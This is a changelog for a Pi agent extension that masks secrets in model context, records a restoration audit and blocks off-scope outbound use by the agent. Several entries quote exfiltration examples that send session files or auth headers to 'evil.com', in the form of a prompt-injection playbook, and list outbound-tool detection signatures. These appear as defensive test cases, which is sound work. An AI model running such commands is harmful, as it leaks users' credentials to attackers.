# Changelog

## Unreleased
- Added: the `/masking` settings row **Allowlist** becomes **Destinations** — one editor now hosts both global lists side by side: the exempt values (`options.allowlist`) and the trusted destinations (`options.trustedDestinations`, previously config-only). Tab switches lists; each list supports add / inline edit / delete / F2 JSON staging; the exit confirmation summarizes both lists and saves them together through the options pipeline. Options screen stays at five rows.
- Changed: **scope mode governs every scoped rule unconditionally** — the detection-gap cell (outbound signature, no verifiable destination) and the local cell (strict use-not-copy) no longer require a declared `destinations` allowlist. A scope of just `mode`+`onRefuse` is now a complete, fully governed configuration. `destinations` is purely the allowlist: present = matched destinations only, `[]` = never outbound, absent = no destination checks ("Anywhere") with the mode still governing blind sends. `options.trustedDestinations` no longer fabricates an allowlist for rules that did not declare one.
- Changed: **vault Outbound unified with rule scopes** — `options.persistedSecrets.destinations` is optional: absent key = Anywhere (the `"*"` token is gone; it is no longer a valid destination entry and degrades to `[]` = Never on load, with a warning), `[]` = Never, list = listed only. Anywhere is mode-governed (blind sends still blocked under strict/semi-strict), so the old unconditional skip is closed.
- Changed: outbound-intent signatures hardened — single `&` background segments, `$(…)`, backtick and process-substitution payloads, `bash -c`/`powershell -Command` payloads, and wrapper prefixes (`sudo`, `nohup`, `xargs`, `timeout`, `env`, `nice`, …) now register; `socat` and `openssl s_client` (TLS client only — `openssl enc` stays local) joined the table.
- Changed: Windows minimum coverage — backslash paths and `.exe` suffixes normalize (`C:\…\curl.exe` → `curl`), `Invoke-WebRequest`/`iwr`/`Invoke-RestMethod`/`irm` added as signatures, `powershell`/`pwsh` as consumers; lookups are case-insensitive.
- Changed: write-custody marks every structured write target (`tee /tmp/a /tmp/b` materializes the value twice — both paths are marked now), not just the first.
- Fixed: read-result marking now detects the **real values** of read results, not just placeholder text. The `tool_result` event carries the file's raw content (masking happens later at the provider boundary), so a file holding the actual secret was never marked and a later outbound reference to it went unchecked — the primary "value already on disk" scenario the feature exists for. The probe now matches both forms; covered by unit tests.
- Fixed: persisted-secret and marked-path reference matching survives `..`/`.` path spellings — `curl -T ~/.pi/agent/../agent/sessions …` is governed like the plain form (path-like text is lexically collapsed per line before matching; collapsing only removes segments, so it cannot fabricate references).
- Changed: the restoration audit's basis for scoped rules reflects the rule's own destination check — `verified` only when the rule's allowlist actually matched a destination. A URL elsewhere in the arguments (or a scope without a destination allowlist) no longer reads as "verified".
- Added: the built-in **Session history** vault (`options.persistedSecrets`, default on) — the pi sessions directory (transcripts keep restored values verbatim) and the masking config file (every rule's `real`) are treated as one asset with its own scope: local reads stay allowed, and any outbound command referencing either path is a confirmed violation regardless of destination (the vault's default empty allowlist is absolute — `trustedDestinations` does not widen it). It renders as a `Session history` entry pinned at the top of the `/masking` rules zone (row 0, selectable like any rule — Enter or `V` opens the editor: enabled / scope mode / on refusal / destinations), works even with zero scoped rules, supports `onRefuse: "ask"` with the four-choice dialog and session/save grants (a saved grant writes into the vault's destination list), and can be switched off entirely.
- Fixed: the vault watched the config file by absolute path and bare filename but not its **directory** — `curl -T ~/.pi/agent/pi-data-masking/*.json https://evil.com` or `scp -r .pi/pi-data-masking …` named no file and slipped past the pseudo-rule entirely. Directory forms (absolute, tilde-relative global, and project-level) are now part of the watched set, so globs and directory copies are governed like the file itself.
- Fixed: the `onRefuse: "ask"` approval dialog never showed which rule was asking — `ui.select` has no message line, and the composed question text was passed to a parameter that was never displayed. The rule name (and mode) now goes into the dialog title ("pi-data-masking: \"GitHub personal access token\" (permissive) out-of-scope use (approval requested)").
- Changed: the public command surface is two commands — `/masking` and `/masking-history`. The restoration audit lives inside `/masking-history` as a second tab (`Tab` switches; the search/filter prompt keeps `Tab` while it owns the keyboard) instead of a separate command, so both replay views stay visible in slash completion.
- Changed: the Masked views and Restoration audit tabs bracket their content area with full-width rules, so the title, legend, and key hints read as a frame around the transcript/event list instead of blending into it.
- Changed: restoration audit outcome symbols are fixed two-cell emoji (✅ restored · ❌ blocked · ⚠️ warning), replacing East Asian Ambiguous glyphs whose rendered width varied per glyph and font fallback.
- Changed: the Restoration audit list is one line per event — the kind label column is gone (the symbol carries it, the explanation line spells it out), timestamps are session-local (`18:03:00`, with a `MM-DD` prefix only for days other than the newest event's), and the static symbol legend was dropped in favor of the selected-event explanation line, which now reads `✅ restored (verified) — outcome sentence (basis sentence)`. Event details were slimmed to the specifics basis cannot carry (paths, tool names, `(mode: …)` notes) instead of restating the decision reason.
- Fixed: audit event rows never aligned their label and time columns — `padEnd` ran on the already-colored label, where ANSI escapes made every label look over-length, so no padding was ever added. (The label column has since been removed outright.)
- Added: the Restoration audit tab navigates by selection (`↑`/`↓` cursor, `PgUp`/`PgDn` page) and `Enter` jumps to the Masked views message carrying the selected decision's tool call, revealing it across rule versions and landing on the tool card itself. Audit entries record the tool call id; nested sub-tool calls whose ids never reach the transcript show a status line instead of jumping.
- Changed: scope notices carry a mode tag, cap the destination list at two entries, and use conditional remediation wording ("Add it in /masking only if legitimate") instead of advising a scope widening on every failure.
- Fixed: restored values written through shell redirects (`echo … > f`, `tee f`) now mark the target file, so the later outbound reference check covers bash writes and not just `write`/`edit` tool calls.
- Fixed: tool-argument scope checks were silently bypassed whenever stream restore had already swapped placeholders for real values before the `tool_call` hook ran (the normal path in interactive sessions). Every rule appeared to restore unconditionally — no blocks or audit entries, and off-scope destinations received real values. The hook now re-masks protected real values before the scoped decision, so enforcement no longer depends on the input still being in placeholder form. Found by the real-session egress e2e matrix; covered by a new smoke regression test.
- Added: placeholder destinations resolve in place for verification — when a domain masked by another rule appears in a command (as a placeholder), destination checks verify against the real host instead of mismatching the allowlist with a gibberish placeholder hostname. Resolved values never leave the check (only extracted hosts do), and a violation reports the real host in its reason and audit entry.
- Changed: the Rule Builder's scope row is now `Destinations` and shows the destination list (`test.com, *.internal.example.com`) instead of the full scope JSON — `mode` and `onRefuse` already have their own selector rows, so the JSON was duplicated noise. Scopes carrying fields the list cannot express (`envNames`) keep the JSON form; hand-typed `{`-JSON still works and syncs the selectors.
- Added: the `onRefuse: "ask"` approval prompt is now a four-choice dialog — **Allow once** (the old behavior), **Allow … for this session** (a session grant keyed by rule + destination, or rule + tool; later calls to the same target skip the prompt and are audited as a new `session-granted` basis), **Add … to the rule and save** (writes the destination/tool into the rule's config — "always" is a config edit, not a parallel trust store; on save failure the call is blocked, fail closed), and **Block**. Session grants cover the marked-path chain too, and a detection gap offers only Allow once / Block (an unknown destination cannot be trusted).
- Added: `destinations: []` — an explicit empty allowlist meaning **never restore outbound**. The Rule Builder exposes it as an `Outbound` selector (`Anywhere` / `Listed only` / `Never`); `Never` hides the destination list and saves the empty allowlist. With `semi-strict` this is the *local only* rule: the value may be written to files and used by local processes (marked, so a later blind send is still caught and blocked), but it never goes out; with `strict` it is never restored into tool arguments at all. Marked-path checks no longer skip empty-allowlist rules — without that, the two-step path (write the file, then `curl -T file evil.com`) would have leaked exactly what the rule forbids. An explicit empty allowlist is absolute: `options.trustedDestinations` does not widen it back open.
- Egress smoke tests: a new integration suite drives the real extension entry point end to end over the tool_call pipeline (context mask → scoped restore / gap warning / strict block / marker violation block), exercising the index.ts wiring the pure-function unit tests cannot see.
- Added: the audit tab shows the selected event's outcome semantics on the line below the bottom rule (updates as the cursor moves).
- Fixed: `Enter` on an audit event now lands the viewport on the tool card that carried the decision — the inverse mark sits on the card's title line instead of the assistant message's header, so messages with a text preamble before the call no longer look like the jump landed on the reply.
- Added: `restoreScope.mode` gains a third step, `semi-strict` — it blocks confirmed violations and local use like strict, but tolerates detection gaps (an outbound call whose destination cannot be verified restores with a warning). The ladder is now strict → semi-strict → permissive, selectable in the Rule Builder's Scope mode row.
- Changed: the scope decision model is block-or-restore, with no placeholder-execution path. Confirmed violations (destination outside the allowlist, tool not in the rule's allowlist) block the call under strict/semi-strict and **ask the user under permissive** — running a command disarmed with a placeholder neither protects the task nor the secret, and a known-bad destination deserves either a hard no or a human yes, never a silent pass.
- Changed: the audit trail records two orthogonal dimensions instead of one mixed vocabulary. The outcome (`kind`) says what happened — `restored` (the value left), `blocked` (the call was refused), `warning` (annotation: the call ran, the marker chain's observability ended) — and the basis says why (`verified`, `unverifiable`, `violation`, `local`, `consumer`, `user-approved`, `user-declined`), the same rows as the decision matrix. The selected event's explanation line spells the combination out; the old `unverified`/`confirmed`/`declined` kinds conflated outcome with reason and are gone.
- Changed: the semi-strict rung now hardens the outbound boundary instead of the local one: it **blocks calls with outbound intent whose destination cannot be verified** (a blind `curl "$URL"` fails closed, including egress of a marked file) and **allows local materialization** (files and local processes, with the marker chain covering later egress). Rationale: strictness should follow outbound intent — the injection playbook (`URL=evil; curl "$URL" -H "Auth: <real>"`) is blocked instead of warned, while legitimate local workflows (`.env`, `.npmrc`) run untouched.
- Changed: `restoreScope` is fully explicit — a rule either has no scope (restores unconditionally) or a complete one; `mode` and `onRefuse` are required fields validated at load time, and incomplete scopes skip the rule with a warning naming the missing field. Nothing is derived from a rule's origin: the config file always states the effective policy.
- Changed: `preset` rule references are removed. Built-in presets live only in the Rule Builder as templates that materialize (pattern, description, and for issuer presets a full `restoreScope` with the issuer's domains, `mode: "strict"`, `onRefuse: "block"`) into ordinary regex rules; configs referencing `preset` now skip the rule with a materialization hint.
- Added: `restoreScope.onRefuse: "block" | "ask"` — the refusal action is a per-rule choice, independent of the mode: the mode decides which situations withhold the value, `onRefuse` decides who refuses it. `block` refuses the call outright and tells the model why; `ask` pauses for the user's approval (approve releases this one call, decline blocks it; headless sessions decline). `strict` + `ask` puts a human behind every withheld value (useful while learning what a rule would block), `permissive` + `block` never asks. The Rule Builder shows an "On refusal" selector under Scope mode; changing the mode re-presets it, and both selectors stay in sync with hand-typed scope JSON in both directions.
- Added: consumer warning — when a marked path (or a restored placeholder) is handed to a code-executing or environment-loading command (`python`, `node`, `bash`, `source`, …), whose own network behavior is not observable, the extension warns once per rule+target per session and records a `warning` audit entry (basis `consumer`). It never blocks: it marks the point where the marker chain's observability ends. Outbound tools (`git`, `docker`) and directory-containment matching are deliberately out of scope (documented residual risk).
- Changed: strict and semi-strict block local use of a scoped value — writing it into a file or passing it to a local process is a violation of "this value only flows to its allowlisted destinations" (use-not-copy); the block reason points to the literal-destination and permissive exits. Permissive local restores stay allowed and are now quiet (the file-marker chain covers later egress). The unverifiable-restore notice now fires only for the detection-gap cell (outbound call, unverifiable destination).
- Added: permissive confirmed violations pause for the user — the prompt names the value, the offending destination (or disallowed tool), and the rule; approving releases this one call (audit `restored` · `user-approved`), declining blocks it with the reason returned to the model (audit `blocked` · `user-declined`). Applies to both enforcement dimensions: a marked file sent off-scope asks the same question a placeholder-bearing argument would. Without a UI (headless), the ask fails closed.

### Added

- Scoped restoration: rules can declare a `restoreScope` restricting where their real values may flow once restored into tool arguments — an allowlist of network destinations (dot-anchored domains, IP literals, intranet wildcards) and a strict/semi-strict/permissive mode ladder. A confirmed violation blocks the call in every mode; the mode decides what happens when the destination cannot be verified. A global `options.trustedDestinations` list (trusted intranet, registry mirrors) is merged into every rule's destination allowlist, so shared trusted destinations are declared once instead of per rule; it widens destination checks only. Configure the field in the Rule Builder's Restore scope row or as rule JSON.
- File markers: when a restored value is written to a file (write/edit) the path is marked for the session, so a later outbound command referencing that file (an extracted destination or a network signature such as `curl`/`wget`/`scp`) is checked against the marking rules' scopes. Rules backed by environment variables (`realFromEnv`, or an explicit `envNames` scope field) are governed the same way when a command references `$NAME`/`${NAME}`/`$env:NAME`. Files the model has only *read* (values already on disk before the session) are covered too: when a read result contains masked values, the read path is marked as well. Violations block the command with a reason naming the offending destination. Copies and moves (`cp`/`mv`/`rsync`) carry the marking to the new path. Local reads, diffs, and greps of marked files are never affected — checks fire only on calls with outbound intent. The marker registry is persisted with the session, so resuming keeps the custody chain.
- Network-signature tightening: a command that runs a known outbound tool (`curl`, `wget`, `ssh`, `scp`, DNS resolvers like `dig`/`nslookup`, …) but carries no extractable destination (`curl … "$DEPLOY_URL"`) is treated as the detection-gap cell: blocked under strict, restored with a warning under semi-strict/permissive — loose handling applies only to calls with no outbound form at all.
- Destinations kept in environment variables are resolved at decision time (`curl … "$DEPLOY_URL"` with `DEPLOY_URL=https://api.stripe.com` verifies cleanly); variables bound to rule secrets are never resolved.
- Most vendor API-key presets now carry their issuer's API domains, materialized into the rule when the template is added (OpenAI, Anthropic, Google, Stripe, Telegram, … 59 of 69 presets). A handful with no single legitimate destination (Vault tokens, self-hosted WooCommerce keys, …) intentionally remain unrestricted.

- Rule Builder Scope mode selector: a dedicated ←/→ row next to Restore scope (shown whenever a scope is in play) cycling strict → semi-strict → permissive, starting at semi-strict (strict when an issuer-preset template carried destinations) and always written to the config.

- Rule Builder Restore scope: preset default destinations are prefilled into the field (editable like any other field), and the field now accepts a comma-separated destination list in addition to full JSON — wildcards (`*.corp.internal`, `10.0.*`) are validated with the same matcher the enforcement uses, and invalid entries block the save with a clear message.

- Restoration audit: every restore, block, and boundary warning (with its basis) is persisted as a session entry and replayed on resume; the Restoration audit tab of `/masking-history` lists the trail (time, outcome, tool, rule, destinations) with a text filter, answering "where has this value been restored to" and "why was that command blocked".
- Scope guidance: when model guidance is fully enabled, the system-prompt note declares each scoped rule's destination allowlist ("only stripe.com — report contradictions instead of rerouting"), so legitimate tasks pick the right destination up front and injected tasks surface as reported contradictions. Capped at 12 rules.
- The rules list in `/masking` shows the cursor position and the filtered total on the rules heading, and the hint bar lists the navigation keys, so a list longer than the screen no longer looks complete.

## [0.9.0] - 2026-09-23

### Added

- Built-in presets now cover major AI model providers, AI search and scraping services, and popular developer platforms (cloud infrastructure, payments, version control, communication, monitoring, and more): fifty-eight new presets, with updated token formats for the existing GitHub, Slack, GitLab, Stripe, and Telegram presets.
- Rule Builder preset picker: type to filter presets by name, browse a scrollable alphabetically sorted list, and mark several with Space to add them all at once with their default settings.

### Changed

- Placeholder values generated from preset rules keep the service prefix visible (for example `sk_live_`, `tskey-api-`), so masked keys stay recognizable.
- Rule Builder structured form: new "Keep prefix" option controls how much of the value a generated placeholder keeps — Off, First segment, or First N chars.
- Rule Builder: the Disclose row shows when a global override is in effect.

### Fixed

- Preserve authentication and model metadata when wrapping native providers on Pi 0.86 and later.

## [0.8.1] - 2026-09-22

### Fixed

- Starting a session when the masking config file or its directory does not exist yet no longer crashes Pi with an ENOSPC uncaughtException from excessive file watchers.

## [0.8.0] - 2026-09-16

### Added

- Global allowlist: values or whole lines listed in `/masking` → Settings → Allowlist (or `options.allowlist` in the global config) stay unmasked even when a rule would match — e.g. keep one IP visible while other IPs are masked.

### Changed

- **Breaking:** removed the global `options.caseSensitive` option; case sensitivity is now decided per rule and per allowlist entry (default: case-sensitive), settable from the Rule Builder (Case field) and the allowlist editor. Existing configs are migrated automatically on load, and `/masking` offers a one-click repair to rewrite the config to the new format.
- `/masking` now always edits the global config's settings; a leftover `options` object in a project config is ignored, with a one-time prompt to migrate it into the global config.
- Placeholder disclosure is now a three-position switch: on, off, or per-rule (default). The rule-level setting became a plain on/off toggle; existing configs keep their meaning.
- Pending config changes are visible immediately in the status line and `/masking`, with an "activates next run" hint.
- Notifications and the status line use a plain "pi-data-masking:" prefix instead of emoji icons.
- Saves with a predicted prefix-cache impact now apply immediately, with the estimate shown as a warning on the `/masking` header instead of a blocking dialog. Blocking confirmations are reserved for safety-relevant actions (delete, import, batch enable/disable, disabling global masking).
- `/masking` visual polish: consistent toggle cells for settings rows and rules, with ←/→ support.

### Fixed

- Tool call arguments are restored to real values in the main conversation after execution (still left as placeholders while streaming).
- Model guidance and Disclose toggles now show their prefix-cache impact everywhere rule toggles do, including after resuming a session and on OpenAI-style providers.
- Disabled rules no longer produce quality warnings at load time; checks re-fire when the rule is re-enabled.

## [0.7.0] - 2026-09-12

### Added

- Expanded `systemPromptGuidance` contract (now editable in the `/masking` settings zone). When enabled, a guidance note is injected into the system prompt telling the model how to work with masked placeholders; this change extends it to counter common secret-handling heuristics: grants exact full-string equality, requires verbatim tool-call passthrough, routes transformations through tools, and tells the model to report inexplicable contradictions instead of hunting for the original values.
- Opt-in placeholder disclosure: `options.disclosePlaceholders` (global) with tri-state per-rule overrides. When enabled, the session's actual literal-rule placeholder strings (grouped by structure fidelity) are listed in the model guidance, so the model can tell which strings are substitutes instead of guessing. Requires and enables `systemPromptGuidance`; WAIT-state env rules and regex placeholders are never listed.
- `/masking-history`: press `/` to search the transcript. Typing jumps incrementally between matches, `Enter`/`Ctrl+R` cycle focus forward and backward (both wrap), and all visible matches are highlighted. In side-by-side compare view only the active column is searched.
- New settings row `Status line` toggles the masking summary in the main chat window (`options.showStatusBar`).
- `/masking` subcommands: `/masking test <text>` previews masking locally, `/masking on` and `/masking off` toggle the global masking switch.

### Changed

- `/masking`: rule enable/disable and edits with cache impact confirm inline instead of stacking a second overlay window; compacted layout (summary on the header line, list fills the terminal, hints at the bottom); Esc closes from any zone.
- Rules-list details show the exact value unquoted plus a `Disclose:` line with the rule's effective disclosure mode.
- Removed the "Masking config reloaded" notification after every rule change.

### Fixed

- Fix `/masking-history` showing the previous branch's history after `/tree` navigation.
- Fix the save-time impact confirmation firing for rules that have never fired on any message: it now re-masks both candidate and active configs fresh instead of comparing against recorded masked hashes.
- Fix live streaming in @jmfederico/pi-web still showing masked placeholders; real values now appear from the first streaming delta there too.

## [0.6.2] - 2026-09-01

### Added

- Real values now appear from the first streaming delta in every UI, including pi's web client: assistant text and thinking are restored live as the model streams them, so long thinking output no longer leaves masked placeholders in the terminal scrollback after completion.
- Tool arguments are still restored only at tool execution; stream transform failures fall back to passing events through untouched, so a transform bug can never break streaming.
- Warn when a literal value or custom placeholder collides with a bundled common term (e.g. a word that also appears in normal prose), so ambiguous rules are caught before they cause accidental unmasking.

### Changed

- Disabling global masking from the `/masking` home screen now confirms inline (warning and Yes/No selector rendered inside the same screen, `←→` select · `Enter` confirm · `Esc` cancel) instead of opening a separate overlay window. The confirmation only appears when the session's model-bound context has actually been masked — i.e. disabling would change the outbound prefix and drop provider prefix-cache reuse; otherwise the toggle applies immediately.
- The `/masking` configuration home is faster to navigate, with direct JSON editing, sensitive-value visibility controls, and clearer compact layouts.
- Creating a global rule is simpler: global scope by default, generated IDs, immediate test previews, and validation when saving.

### Fixed

- `/masking-history` comparisons no longer repeatedly rewind a shared prefix to the start of a word without making progress.

## [0.6.1] - 2026-08-29

### Added

- Add a built-in preset for publicly routable IPv4 addresses, excluding private and common special-use ranges.

### Changed

- Clarify that the private IPv4 preset preserves its first two octets by default.
- Expand the README with common use cases and FAQs, and clarify the masking boundary and the benefits and limitations of structure-preserving placeholders.

## [0.6.0] - 2026-08-29

### Added

- Add save-time preflight for masking changes that may alter the model-facing prompt prefix and reduce provider prompt-cache reuse, identifying the earliest affected system prompt or conversation message before rules are written.
- Add rule-version auditing to `/masking-history`: navigate versions that reached the model with `[` and `]`, inspect rules and net changes with `R`, and retain immutable transcripts—including compacted messages—plus sanitized metadata and session-keyed boundary fingerprints without storing boundary plaintext.

### Changed

- Move the persistent global masking switch into `/masking` under the `M` shortcut, with disable confirmation and pending-run status.
- Cache masked output for unchanged history across requests, improving performance while preventing repeated masking and isolating cached values from external mutation.

### Removed

- Remove `/masking-toggle`; use `M` from within `/masking` instead.

### Fixed

- Improve `/masking-history` at narrow widths and correct comparison headings, controls, occurrence navigation, lexical highlighting, and message styling.
- Preserve the selected history display mode across rule versions and refresh masked history when rules change even if the source message does not.
- Fix package dependency metadata by declaring Pi core modules as peers, preventing duplicate Pi runtime installations.
- Keep all `/masking` workflows on a clean full-screen surface without flashing conversation history or blank intermediate screens.

## [0.5.0] - 2026-08-24

### Added

- Add the unified `/masking` configuration center for managing, ordering, testing, importing, and exporting project/global rules.
- Add per-rule enable switches, environment-backed literals, human-readable rule names, and automatic or custom placeholders.
- Add ten built-in presets and a JSON Schema for configuration validation and editor completion.
- Add advisory diagnostics for custom regexes that may cause excessive backtracking.
- Add local rule testing to the configuration home screen and Rule Builder.

### Changed

- Make first-seen provenance immutable for the entire conversation, preserving stable model-facing history and prompt-cache prefixes.
- Apply rule toggles and reordering in place while preserving configuration-screen state.
- Reduce the public command set to `/masking`, `/masking-toggle`, and `/masking-history`.
- Update Pi runtime dependencies to 0.84.2, resolving audited transitive vulnerabilities.
- Rewrite the README around quick start, security boundaries, masking limitations, placeholder generation, and performance.

### Fixed

- Keep the last valid configuration active during transient read or parse failures.
- Roll back multi-file configuration changes when a later write fails.
- Preserve Rule Builder drafts after save failures and confirm before discarding changed drafts.
- Fix Enter handling in Rule Builder text fields.

### Removed

- Remove `/masking-config`, `/masking-test`, `/masking-list`, `/masking-init`, and `/masking-rule`; their workflows are now covered by `/masking`.

## [0.4.2] - 2026-08-22

### Fixed

- Reworked `/masking-history` scrolling to render and cache only the visible transcript window instead of eagerly rendering the complete conversation.
- Preserved fast back-navigation by caching rendered message blocks and correctly invalidating them when the theme or display mode changes.

## [0.4.1] - 2026-08-22

### Fixed

- Made `/masking-history` scrolling fast in long conversations by reusing the rendered transcript while paging, with automatic refresh when display settings or terminal width change.

## [0.4.0] - 2026-08-20

### Added

- Full-screen `/masking-list` and `/masking-history` views.
- Local-original, model-input, and comparison history modes with scrolling and replacement inspection.
- Tool-output expansion and thinking-block visibility controls in the history viewer.
- Persistent history snapshots and session keys, allowing history inspection and stable placeholders after restarting Pi.
- Persistent `/masking-toggle` state shared across sessions and projects.

### Changed

- History differences are highlighted without injecting brackets or parentheses into message text.
- Tool outputs use a 10-line collapsed preview.
- Public documentation was consolidated into a shorter README with clearer global/project configuration guidance.

### Removed

- `/masking-status`, `/masking-clear`, and `/masking-reload`; the status bar, full-screen viewers, automatic config refresh, and Pi lifecycle cover their use cases.
- The automatic per-round statistics panel and its unused in-memory history.
- Outdated internal design documents from the public repository.

## [0.3.0] - 2026-08-19

### Added

- First-seen provenance tracking for user, assistant, and tool-result values.
- `preserveStructure.keepPrefix` and `preserveStructure.keepIPv4Octets`.
- Low-entropy rule warnings and the `lowEntropy` acknowledgement field.
- Optional `systemPromptGuidance`.
- Deterministic HMAC-based placeholders scoped to a session.

### Changed

- Values first generated by the model remain unmasked for that session, while user and tool-result values register for protection.
- Example rules favor exact values and recognizable token structures instead of broad key-name matching.

## [0.2.1] - 2026-08-09

### Fixed

- Made repeated masking idempotent so the provider-boundary safety pass does not mask existing placeholders again.

## [0.2.0] - 2026-08-08

### Added

- Placeholder collision detection and retry.
- Config parsing, validation, warnings, and automatic refresh.
- System-prompt masking and a final provider-request safety boundary.
- Dynamic-map growth warnings.
- Unit tests and GitHub Actions CI.
- Expanded example rules for common credentials, tokens, private keys, network values, and contact data.

### Fixed

- Case-insensitive unmasking now follows the configured matching behavior.
- Config files created after session start are detected.

## [0.1.4] - 2026-07-02

### Added

- A key-name-based example regex for assignment-style secrets. This rule was later removed in 0.3.0 because it produced false positives and missed important value shapes.

> Historical note: the `v0.1.4` tag points to source whose `package.json` still reports `0.1.3`.

## [0.1.3] - 2026-07-01

### Added

- `/masking-test` for previewing transformations without sending text to the model.

## [0.1.2] - 2026-07-01

- Version metadata update; no functional source changes recorded.

## [0.1.1] - 2026-07-01

- Version metadata update; no functional source changes recorded.

## [0.1.0] - 2026-07-01

### Added

- Initial Pi extension with literal and regex masking rules.
- Format-preserving placeholders and reverse mapping for tool calls and assistant output.
- Global and project configuration support.
- Status display, masking controls, and example configuration.
